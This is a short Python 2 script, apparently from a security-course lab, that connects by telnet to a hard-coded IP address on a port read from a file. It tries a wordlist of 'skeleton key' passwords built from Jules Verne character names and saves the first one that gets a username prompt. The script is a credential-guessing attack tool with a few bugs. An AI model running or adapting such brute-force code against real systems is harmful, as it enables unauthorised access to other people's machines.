#!/usr/bin/env python

import socket
import errno
import requests
from requests.auth import HTTPBasicAuth

import getpass
import sys
import telnetlib

import time

UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'

IN_FILE = "openPorts.txt"
OUT_FILE = "skeletonKey.txt"

skeletonPossibilities = ['JeanPassepartout', 'Jean_Passepartout', 'Jean-Passepartout',
	 'jeanpassepartout', 'jean_passepartout', 'jean-passepartout',
	 'jeanPassepartout', 'jean_Passepartout', 'jean-Passepartout',
	'jean', 'Jean', 'JEAN', 'passepartout', 'Passepartout', 'PASSEPARTOUT',
	 'JEANPASSEPARTOUT', 'JEAN_PASSEPARTOUT', 'JEAN-PASSEPARTOUT',
	 'JulesVern', 'Jules_Vern', 'Jules-Vern',
	'julesvern', 'jules_vern', 'jules-vern',
	 'julesVern', 'jules_Vern', 'jules-Vern',
	'jules', 'Jules', 'JULES', 'Vern', 'vern', 'VERN',
	 'JULESVERN', 'JULES_VERN', 'JULES-VERN', 'Aouda', 'AOUDA',
	 'PhileasFogg', 'Phileas_Fogg', 'Phileas-Fogg',
	 'phileasfogg', 'phileas_fogg', 'phileas-fogg',
	 'phileasFogg', 'phileas_Fogg', 'phileas-Fogg',
	'phileas', 'Phileas', 'PHILEAS', 'Fogg', 'fogg', 'FOGG',
	 'PHILEASFOGG', 'PHILEAS_FOGG', 'PHILEAS-FOGG',
	 'ReformClub', 'Reform_Club',  'Reform-Club'
	 'reformclub', 'reform_club', 'reform-club',
	 'reformClub', 'reform_Club', 'reform-Club',
	'reform', 'Reform', 'REFORM', 'Club', 'CLUB', 'club',
	 'REFORMCLUB', 'REFORM_CLUB', 'REFORM-CLUB',
	 'GoesEverywhere', 'Goes_Everywhere', 'Goes-Everywhere',
	 'goeseverywhere', 'goes_everywhere', 'goes-everywhere', 
	 'goesEverywhere', 'goes_Everywhere', 'goes-Everywhere',
	 'GOESEVERYWHERE', 'GOES_EVERYWHERE', 'GOES-EVERYWHERE',
	'PASSPORT', 'passport', 'Passport'
	]


def get_ports():
	openPorts = []

	file = open(IN_FILE, "r")

	for line in file:
		openPorts.append(line[:-1])

	file.close()
	return openPorts

#https://docs.python.org/2.4/lib/telnet-example.html
def main():

	HOST = IP_ADDRESS
		#!change to random poort

	#openPorts = []
	file = open(OUT_FILE, "w")

	openPorts = get_ports()
	#make it truly random
	RANDOM_PORT = str(openPorts[5])

	for sKey in skeletonPossibilities:

		tnet = telnetlib.Telnet(HOST, RANDOM_PORT)
		
		try: 
			#print sKey
			tnet.write(sKey + "\n")

			tnet.read_until("Username: ")

			tnet.write(UNAME + "\n")

			file.write(sKey + "\n")
			file.close()
			break

			#print tnet.read_all()

		except EOFError, v:

			continue
			#print "no"


if __name__ == '__main__':
	main()